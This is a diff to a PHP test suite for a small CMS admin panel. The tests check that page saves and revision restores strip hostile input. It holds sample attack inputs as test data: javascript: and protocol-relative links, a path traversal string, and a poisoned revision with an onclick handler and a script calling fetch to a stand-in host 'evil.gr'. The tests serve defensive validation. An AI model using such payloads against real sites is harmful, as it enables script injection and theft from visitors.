@@ -19,14 +19,21 @@ putenv('AUTH_DEV_BYPASS=1');   // explicit, exactly as .ddev/config.yaml does it
 $_SESSION['csrf'] = 'test-token';
 $hostile = require __DIR__ . '/fixtures/hostile_save.php';
 
-$file   = dirname(__DIR__) . '/content/pages/home.yml';
+$file   = dirname(__DIR__) . '/content/pages/el/home.yml';
 $backup = $file . '.bak';
 copy($file, $backup);
 
 $before = Yaml::parseFile($file);
 
+// The hero's stored image, read rather than hardcoded: this is demo content,
+// and someone replacing the picture in the panel must not fail the suite.
+$storedImage = $before['blocks'][0]['fields']['image'];
+
 // Correct baseline: this save is legitimate in every way except its payload.
-$response = admin_post($hostile('test-token', (string) hash_file('sha256', $file)));
+$response = admin_post($hostile('test-token', (string) hash_file('sha256', $file), $storedImage['src']));
+
+$blockNo = static fn (array $page, string $id): int
+    => (int) array_search($id, array_column($page['blocks'], 'id'), true);
 
 $after = Yaml::parseFile($file);
 $hero  = $after['blocks'][0]['fields'];
@@ -36,7 +43,7 @@ section('Save completed');
 // Stronger than the old "the child process exited 0": a save that fell into the
 // error page also exited 0. Only the write path redirects.
 ok($response->getStatusCode() === 303, 'the save was accepted and redirected (303), not refused');
-ok(count($after['blocks']) === count($before['blocks']), 'block count unchanged (4)');
+ok(count($after['blocks']) === count($before['blocks']), 'block count unchanged (' . count($before['blocks']) . ')');
 
 section('Structure is not editable');
 ok($after['blocks'][0]['type'] === 'hero', 'posting blocks[hero][type] did not retype the component');
@@ -60,6 +67,133 @@ ok(mb_strlen($hero['heading']) <= 70, 'max length respected');
 
 section('Link fields reject hostile URLs');
 ok($hero['cta_url'] === '', 'javascript: URL rejected outright');
+
+section('An image is an object, and the server owns half of it');
+// The client owns src and alt. width, height and `decorative` are the
+// server's, and posting them has to be a no-op rather than a validation error
+// — the browser sends the whole map back on every save.
+ok(is_array($hero['image']), 'an image field stores a map, not a path');
+ok(array_keys($hero['image']) === ['src', 'alt', 'width', 'height'],
+    'with exactly the declared sub-keys: ' . implode(', ', array_keys($hero['image'])));
+ok(!array_key_exists('evil', $hero['image']), 'an undeclared sub-key is dropped, exactly as at the top level');
+ok(!array_key_exists('decorative', $hero['image']),
+    'a forged `decorative` never lands: it is a schema value, not a request value');
+ok($hero['image']['width'] === $storedImage['width'] && $hero['image']['height'] === $storedImage['height'],
+    'a forged 99999x99999 is ignored in favour of the pair already on disk for that src ('
+    . $hero['image']['width'] . 'x' . $hero['image']['height'] . ')');
+ok($hero['image']['width'] > 0, 'which is a real measurement, not a silent zero');
+ok($hero['image']['alt'] === '',
+    'hero declares decorative: true, so alt is empty by declaration — posting one changes nothing');
+ok($intro['image']['src'] === '', 'an image src outside media_bases is rejected — no open image proxy');
+
+section('Alt cannot be forgotten on an image that carries information');
+$withImage = static fn (array $image): array => [
+    'action'   => 'save',
+    'csrf'     => 'test-token',
+    'page'     => 'home',
+    'baseline' => (string) hash_file('sha256', $file),
+    'blocks'   => ['intro' => ['image' => $image]],
+];
+// Any src the media guard accepts will do; take the one the page already has
+// rather than naming a file someone may replace from the panel.
+$real = (string) $storedImage['src'];
+
+$noAlt = admin_post($withImage(['src' => $real, 'alt' => '   ']));
+ok($noAlt->getStatusCode() === 400, 'a non-decorative image with a file and no description is refused');
+contains((string) $noAlt->getContent(), 'Περιγραφή εικόνας', 'and the refusal names the field the client has to fill in');
+ok(Yaml::parseFile($file)['blocks'][1]['fields']['image']['src'] === '', 'nothing was written by the refused save');
+
+// The condition matters: Phase 6's og_image defaults to an empty map on every
+// page, and an unconditional rule would make every page unsaveable.
+$empty = admin_post($withImage(['src' => '', 'alt' => '']));
+ok($empty->getStatusCode() === 303, 'while an image field left empty saves fine');
+
+$ok = admin_post($withImage(['src' => $real, 'alt' => 'Η ομάδα μας στο γραφείο']));
+ok($ok->getStatusCode() === 303, 'and a described image saves');
+ok(Yaml::parseFile($file)['blocks'][1]['fields']['image']['alt'] === 'Η ομάδα μας στο γραφείο', 'with its description');
+
+section('The panel offers an alt input exactly where the save path demands one');
+$imgForm = (string) admin_get(['action' => 'edit', 'page' => 'home'])->getContent();
+contains($imgForm, 'name="blocks[intro][image][alt]"', 'a meaningful image gets an alt input');
+missing($imgForm, 'name="blocks[hero][image][alt]"', 'a decorative one gets none — asking would produce "photo"');
+contains($imgForm, 'name="blocks[hero][image][src]"', 'but it still gets its file picker');
+
+section('A list is bounded before it is walked, not after');
+$faq = $after['blocks'][$blockNo($after, 'faq')]['fields'];
+ok(count($faq['questions']) === 20, '200 posted rows into a max: 20 list truncates to 20, not 200');
+ok(array_is_list($faq['questions']),
+    'attacker-chosen keys cannot turn the list into a YAML map — array_values() runs before the item loop');
+ok(!array_key_exists('evil', $faq['questions'][0]), 'an undeclared sub-field is dropped inside a row, exactly as at the top level');
+ok(array_keys($faq['questions'][0]) === ['question', 'answer'], 'a row holds the sub-schema and nothing else');
+missing($faq['questions'][0]['question'], '<script', 'a row is sanitised by its own field type');
+missing($faq['questions'][0]['answer'], 'onclick', 'and so is its richtext');
+
+// Cheap proof that the bound is applied *before* the walk rather than after:
+// 200 rows of richtext through the HTML sanitiser is measurable, 20 is not.
+$raw = (string) file_get_contents($file);
+ok(substr_count($raw, 'question:') === 20, 'and only 20 rows reached the file');
+
+section('A boolean stores a real YAML bool');
+ok($faq['open_first'] === false, 'a value that is not a recognised truthy literal is false, not the string itself');
+ok(str_contains($raw, 'open_first: false'), 'and it lands in the YAML as a bool: ' . trim(explode("\n", explode('open_first:', $raw)[1])[0]));
+
+$boolOn = admin_post([
+    'action' => 'save', 'csrf' => 'test-token', 'page' => 'home',
+    'baseline' => (string) hash_file('sha256', $file),
+    'blocks' => ['faq' => ['open_first' => '1']],
+]);
+ok($boolOn->getStatusCode() === 303, 'a checked box saves');
+ok(Yaml::parseFile($file)['blocks'][$blockNo(Yaml::parseFile($file), 'faq')]['fields']['open_first'] === true,
+    'as a real true, so a template can branch on it without parsing strings');
+
+section('A link stores a page id, and a slug rename cannot break it');
+$linkTo = static fn (string $v): array => [
+    'action' => 'save', 'csrf' => 'test-token', 'page' => 'home',
+    'baseline' => (string) hash_file('sha256', $file),
+    'blocks' => ['hero' => ['cta_url' => $v, 'cta_label' => 'Επικοινωνία']],
+];
+$heroOf = static fn (): array => Yaml::parseFile($file)['blocks'][0]['fields'];
+
+admin_post($linkTo('epikoinonia'));
+ok($heroOf()['cta_url'] === 'epikoinonia', 'a real page id is stored as the id, not as a URL');
+
+foreach ([
+    'javascript:alert(1)'  => 'a javascript: URL',
+    '//evil.gr'            => 'a protocol-relative host',
+    'https://evil.gr/x'    => 'an absolute URL',
+    '/epikoinonia'         => 'a slug — the id is the filename, and slugs move',
+    '../../config'         => 'a traversal',
+    'home.yml'             => 'a filename',
+] as $bad => $why) {
+    admin_post($linkTo($bad));
+    ok($heroOf()['cta_url'] === '', 'refused: ' . $why . ' (stored: "' . $heroOf()['cta_url'] . '")');
+}
+
+// The whole point of storing the id: the href follows the slug wherever it goes.
+$other = dirname(__DIR__) . '/content/pages/el/epikoinonia.yml';
+copy($other, $other . '.bak');
+
+$renamed = cms();
+$page = $renamed->content->load('epikoinonia');
+$page['slug'] = '/nea-epikoinonia';
+$renamed->content->save('epikoinonia', $page);
+
+admin_post($linkTo('epikoinonia'));
+$rendered = cms()->renderPage(cms()->content->load('home'));
+contains($rendered, 'href="/nea-epikoinonia"', 'renaming a slug leaves the internal link intact, pointing at the new slug');
+
+// Byte-for-byte, comments included: save() rewrites the file, and a suite run
+// must not quietly edit the developer's own content.
+rename($other . '.bak', $other);
+array_map('unlink', glob(dirname(__DIR__) . '/content/.revisions/epikoinonia.*.yml') ?: []);
+
+// An id that no longer resolves must not become a dead href.
+admin_post($linkTo('deleted-page'));
+$dead = cms()->renderPage(cms()->content->load('home'));
+missing($dead, 'href="deleted-page"', 'an id that no longer resolves is never rendered as an href');
+contains($dead, '<span class="btn is-dead">Επικοινωνία</span>', 'it renders as plain text instead');
+contains((string) admin_get(['action' => 'edit', 'page' => 'home'])->getContent(),
+    'δεν υπάρχει πια', 'and the panel flags it so it can actually be fixed');
 
 section('Rich text is whitelisted');
 missing($intro['body'], '<script', 'script tag removed');
@@ -94,11 +228,15 @@ $forgeEmail = static fn (string $value): array => [
     'action'   => 'save',
     'csrf'     => 'test-token',
     'page'     => 'home',
-    'baseline' => (string) hash_file('sha256', dirname(__DIR__) . '/content/pages/home.yml'),
+    'baseline' => (string) hash_file('sha256', dirname(__DIR__) . '/content/pages/el/home.yml'),
     'blocks'   => ['contact' => ['email' => $value, 'heading' => 'Πείτε μας τι χρειάζεστε']],
 ];
 
-$emailOf = static fn (): string => (string) Yaml::parseFile($file)['blocks'][3]['fields']['email'];
+$emailOf = static function () use ($file, $blockNo): string {
+    $page = Yaml::parseFile($file);
+
+    return (string) $page['blocks'][$blockNo($page, 'contact')]['fields']['email'];
+};
 
 section('An authenticated address is not automatically a user');
 $stranger = as_user($UNKNOWN, 'GET', ['action' => 'edit', 'page' => 'home']);
@@ -186,10 +324,12 @@ $poisoned['blocks'][0]['fields']['heading'] = 'Παλιά επικεφαλίδα
 $poisoned['blocks'][0]['fields']['align'] = 'start';                     // editable: false
 $poisoned['blocks'][1]['fields']['body'] = '<p onclick="steal()">Παλιό κείμενο'
     . '<script>fetch("//evil.gr")</script><a href="javascript:alert(1)">κακός</a></p>';
-$poisoned['blocks'][3]['fields']['email'] = 'palio@example.gr';          // editable: admin
+$poisoned['blocks'][$blockNo($poisoned, 'contact')]['fields']['email'] = 'palio@example.gr'; // editable: admin
 $poisoned['blocks'][] = ['id' => 'ghost', 'type' => 'hero', 'fields' => ['heading' => 'Δεν υπάρχω']];
 $poisonedName = 'home.20260101-000000-abcdef.yml';
 file_put_contents($revDir . '/' . $poisonedName, Yaml::dump($poisoned, 6, 2));
+
+$namesBefore = array_column(cms()->content->revisions('home'), 'file');
 
 $restored = as_user($ADMIN, 'POST', [
     'action' => 'restore', 'csrf' => 'test-token', 'page' => 'home', 'revision' => $poisonedName,
@@ -209,15 +349,20 @@ contains($intro2['body'], 'Παλιό κείμενο', 'while the legitimate tex
 ok($after2['title'] === 'Παλιός τίτλος', 'the title is restored, sanitised');
 
 ok($after2['slug'] === '/', 'a revision cannot move the page — structure comes from the file, not the revision');
-ok(count($after2['blocks']) === 4, 'nor add a block that is not in the file');
+ok(count($after2['blocks']) === count($before['blocks']), 'nor add a block that is not in the file');
 ok($hero2['align'] === 'center', 'an editable:false field is not overwritten by a revision either');
-ok($after2['blocks'][3]['fields']['email'] === 'palio@example.gr', 'but an editable:admin field is, because restore is an admin flow');
+ok($after2['blocks'][$blockNo($after2, 'contact')]['fields']['email'] === 'palio@example.gr', 'but an editable:admin field is, because restore is an admin flow');
 
 $html2 = cms()->renderPage(cms()->content->load('home'));
 missing($html2, '<script>alert', 'and the restored page renders with nothing injected');
 missing($html2, 'evil.gr', 'nor any laundered link');
 
-ok(count(cms()->content->revisions('home')) > count($revs), 'the version being replaced was snapshotted first — a restore is undoable');
+// Not a count: snapshot() keeps only the last 10, and by this point in the run
+// there are already 10, so the total cannot grow. Ask whether a *new* name
+// appeared instead — and by name rather than by position, because two
+// snapshots inside the same second sort on their random suffix.
+ok(array_diff(array_column(cms()->content->revisions('home'), 'file'), $namesBefore) !== [],
+    'the version being replaced was snapshotted first — a restore is undoable');
 
 // restore
 rename($backup, $file);
